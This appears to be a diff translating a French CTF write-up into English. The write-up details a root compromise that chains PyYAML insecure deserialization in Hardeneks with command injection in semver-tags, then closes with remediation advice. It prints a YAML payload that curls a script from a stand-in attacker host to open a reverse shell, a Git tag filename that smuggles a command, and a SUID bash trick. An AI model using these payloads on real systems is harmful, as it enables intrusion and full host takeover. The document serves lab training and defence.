@@ -1,26 +1,26 @@
-# Writeup CTF - Élévation de Privilèges via Insecure Deserialization & Command Injection
+# CTF Writeup - Privilege Escalation via Insecure Deserialization & Command Injection
 
-## Informations Générales
-- **Cible :** Environnement d'audit EKS (Hardeneks) / Machine semverex
-- **Utilisateur Initial :** ETSCTF
-- **Privilèges Finaux :** root
-- **Vecteurs Principaux :** 
+## General Information
+- **Target:** EKS Audit Environment (Hardeneks) / `semverex` machine
+- **Initial User:** `ETSCTF`
+- **Final Privileges:** `root`
+- **Primary Vectors:** 
   - Insecure Deserialization (PyYAML) -> SNYK-PYTHON-HARDENEKS-3263422
-  - Sudoers Permissif + Command Injection (Node.js) -> CVE-2022-25853 (semver-tags)
+  - Permissive Sudoers + Command Injection (Node.js) -> CVE-2022-25853 (`semver-tags`)
 
 ---
 
-## 1. Accès Initial & RCE (Remote Code Execution)
+## 1. Initial Access & RCE (Remote Code Execution)
 
-### Découverte
-Le scan de ports initial révèle un portail web accessible sur le port 1337. Cette interface permet aux utilisateurs d'uploader un fichier de configuration afin d'auditer des clusters Amazon EKS à l'aide de l'outil Hardeneks.
+### Discovery
+The initial port scan revealed a web portal accessible on **port 1337**. This interface allows users to upload a configuration file to audit Amazon EKS clusters using the **Hardeneks** tool.
 
-D'après le bulletin de sécurité SNYK-PYTHON-HARDENEKS-3263422, les versions obsolètes de cet outil utilisent la fonction vulnérable yaml.load() de PyYAML pour parser les fichiers importés, ce qui expose l'application à une désérialisation non sécurisée (CWE-502).
+According to security advisory **SNYK-PYTHON-HARDENEKS-3263422**, outdated versions of this tool use PyYAML's vulnerable `yaml.load()` function to parse uploaded files, exposing the application to an **insecure deserialization flaw (CWE-502)**.
 
-### Exploitation (Vecteur d'entrée)
-En exploitant la balise de sérialisation d'objets Python !!python/object/apply, il est possible de forcer le serveur à exécuter des commandes système lors de la lecture du fichier YAML. 
+### Exploitation (Entry Vector)
+By leveraging the Python object serialization tag `!!python/object/apply`, it is possible to force the server to execute arbitrary system commands when reading the YAML file.
 
-Un fichier de configuration malveillant (exploit.yaml) a été téléversé pour initier une attaque en deux étapes (two-stage attack) via un téléchargeur invisible :
+A malicious configuration file (`exploit.yaml`) was uploaded to initiate a two-stage attack via a silent downloader:
 
 ```yaml
 settings:
@@ -30,28 +30,28 @@ malicious_payload: !!python/object/apply:subprocess.Popen
   - [ "/bin/sh", "-c", "curl -s http://<ATTACKER_IP>/reverse.sh -o /tmp/run.sh && chmod +x /tmp/run.sh && /tmp/run.sh" ]
 ```
 
-Le script reverse.sh ainsi téléchargé et exécuté a permis d'obtenir un Reverse Shell, établissant un accès initial sur la machine avec les privilèges de l'utilisateur ETSCTF.
+The downloaded and executed `reverse.sh` script established a **Reverse Shell**, granting initial access to the machine with the privileges of the **`ETSCTF`** user.
 
 ---
 
-## 2. Élévation de Privilèges (PrivEsc to Root)
+## 2. Privilege Escalation (PrivEsc to Root)
 
-### Énumération Locale
-Une fois le pied ancré sur le système, l'inspection des privilèges accordés à notre utilisateur via la commande sudo -l révèle une configuration critique :
+### Local Enumeration
+Once a foothold was established on the system, inspecting the privileges granted to our user via the `sudo -l` command revealed a critical configuration:
 
 ```text
 User ETSCTF may run the following commands on semverex:
     (ALL) NOPASSWD: /usr/local/bin/semver-tags
 ```
 
-L'analyse de ce binaire montre qu'il s'agit d'un lien symbolique pointant vers une installation globale du module Node.js semver-tags en version 0.4.10 (/usr/local/lib/node_modules/semver-tags/bin/semver-tags). 
+Analyzing this binary showed that it is a symbolic link pointing to a global installation of the Node.js module `semver-tags` version **0.4.10** (`/usr/local/lib/node_modules/semver-tags/bin/semver-tags`).
 
-Cette version spécifique est affectée par la faille CVE-2022-25853, une vulnérabilité d'injection de commande (CWE-78). Lorsque l'outil interroge les versions d'un projet, il transmet les noms des tags Git directement à la fonction vulnérable child_process.exec(), qui invoque un interpréteur /bin/sh sans assainir les chaînes de caractères.
+This specific version is affected by **CVE-2022-25853**, an **OS command injection vulnerability (CWE-78)**. When the tool queries project versions, it passes Git tag names directly to the vulnerable `child_process.exec()` function, which invokes a `/bin/sh` shell without sanitizing the strings.
 
-### Exploitation (Contournement de la syntaxe Git)
-Le script Node.js encapsulant les arguments de la ligne de commande entre des apostrophes simples ('), l'injection directe via l'argument --repo-path se heurtait à des erreurs de syntaxe du shell. Le moyen le plus fiable pour exploiter cette faille consiste à injecter la charge utile directement dans la base de données interne d'un dépôt Git local.
+### Exploitation (Bypassing Git Syntax Restrictions)
+Since the Node.js script encapsulates command-line arguments between single quotes (`'`), direct injection via the `--repo-path` argument triggered shell syntax errors. The most reliable method to exploit this flaw is to inject the payload **directly into the internal database of a local Git repository**.
 
-1. Initialisation d'un dépôt Git légitime dans le répertoire de l'utilisateur (/home/ETSCTF) pour éviter les protections de sécurité de Git sur les répertoires partagés (dubious ownership) :
+1. **Initialize a legitimate Git repository** inside the user's home directory (`/home/ETSCTF`) to bypass Git's security protections regarding shared directories (`dubious ownership` restrictions in `/tmp`):
    ```bash
    touch README.md
    git config user.name 'ETSCTF'
@@ -60,36 +60,36 @@ Le script Node.js encapsulant les arguments de la ligne de commande entre des ap
    git commit -m 'Initial'
    ```
 
-2. Création d'un script intermédiaire contenant la charge utile (/tmp/x.sh) pour s'affranchir des restrictions d'espaces du parseur automatisé :
+2. **Create an intermediate script** containing the payload (`/tmp/x.sh`) to overcome character parsing limitations and whitespace issues within the automated CTF runner script:
    ```bash
    echo '#!/bin/sh' > /tmp/x.sh
    echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/x.sh
    chmod +x /tmp/x.sh
    ```
 
-3. Injection dans les métadonnées Git : Écriture manuelle du fichier de référence du tag pour y insérer les caractères de contrôle (le point-virgule ; pour clore l'instruction Git et les apostrophes '' pour équilibrer la syntaxe finale de Node.js) :
+3. **Inject into Git metadata:** Manually write the tag reference file to insert the control characters (the semicolon `;` to close the Git command instruction and the single quotes `''` to balance the final syntax appended by Node.js):
    ```bash
    HASH=\$(git rev-parse HEAD)
    echo \$HASH > ".git/refs/tags/v1.0.0;'/tmp/x.sh';"
    ```
 
-4. Déclenchement : Exécution du binaire privilégié via sudo sans aucun argument depuis ce dossier. L'outil scanne le répertoire courant, lit le tag piégé et l'exécute dans son sous-shell root :
+4. **Triggering Execution:** Run the privileged binary via `sudo` without any arguments from this specific directory. The tool scans the current repository, reads the malicious tag name, and evaluates it inside its `root` sub-shell:
    ```bash
    sudo /usr/local/bin/semver-tags
    ```
 
-5. Accès final : Le binaire SUID ayant été généré avec succès dans l'emplacement temporaire, il ne reste plus qu'à l'invoquer pour obtenir un shell root permanent :
+5. **Final Access:** Since the SUID binary was successfully generated in the temporary folder, executing it yields a permanent root shell:
    ```bash
    /tmp/rootbash -p
    ```
-   *Statut : ROOT CONFIRMÉ*
+   *Status: **ROOT CONFIRMED***
 
 ---
 
-## 3. Rapport de Remédiation (Blue Teaming)
+## 3. Remediation Report (Blue Teaming)
 
-Pour sécuriser définitivement ce serveur contre cette chaîne d'attaque, les correctifs suivants doivent être appliqués :
+To permanently secure this server against this specific attack chain, the following structural fixes must be applied:
 
-1. Correction de la RCE (Hardeneks) : Mettre à jour le package hardeneks vers la version 0.7.2 (ou supérieure) ou modifier le code source pour remplacer de manière stricte yaml.load() par yaml.safe_load(). Cela interdit l'instanciation d'objets Python complexes lors du parsing des fichiers de configuration.
-2. Principe du Moindre Privilège : Révoquer la règle NOPASSWD pour l'outil semver-tags dans le fichier /etc/sudoers. Un utilitaire de gestion de tags applicatifs ne doit pas s'exécuter avec les privilèges d'administration du système.
-3. Sécurisation des Processus (Semver-tags) : Mettre à jour le module npm global vers la version 2.0.7 ou supérieure. Le code corrigé utilise désormais execFile(), ce qui transmet les arguments sous forme de tableau isolé au système d'exploitation et neutralise complètement l'évaluation des métacaractères du shell (; , & , | , $() ).
+1. **Fix the RCE (Hardeneks):** Upgrade the `hardeneks` package to version 0.7.2 (or higher) or modify the source code to replace `yaml.load()` strictly with **`yaml.safe_load()`**. This prevents the instantiation of complex Python objects during configuration file parsing.
+2. **Enforce the Principle of Least Privilege:** Remove the `NOPASSWD` entry for the `semver-tags` utility from the `/etc/sudoers` file. A version management script does not require administrative operating system privileges to function.
+3. **Secure Process Execution (Semver-tags):** Upgrade the global npm module to version 2.0.7 or higher. The fixed code utilizes `execFile()`, which passes arguments as a strictly isolated array to the operating system, completely neutralizing the evaluation of shell metacharacters (such as `;`, `&`, `|`, or `$()`).
